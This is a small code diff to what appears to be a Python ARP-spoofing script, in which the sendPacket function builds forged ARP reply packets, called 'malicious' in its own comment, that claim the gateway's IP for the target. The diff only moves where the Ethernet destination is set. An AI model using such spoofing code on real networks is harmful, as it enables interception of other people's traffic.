@@ -22,6 +22,7 @@ def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
     # Function for sending the malicious ARP packets out with the specified data
     ether = Ether()
     ether.src = my_mac
+    ether.dst = target_mac
 
     arp = ARP()
     arp.psrc = gateway_ip
@@ -30,11 +31,6 @@ def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
     arp = arp
     arp.pdst = target_ip
     arp.hwdst = target_mac
-
-    ether = ether
-    ether.src = my_mac
-    ether.dst = target_mac
-
     arp.op = 2
 
     def broadcastPacket():
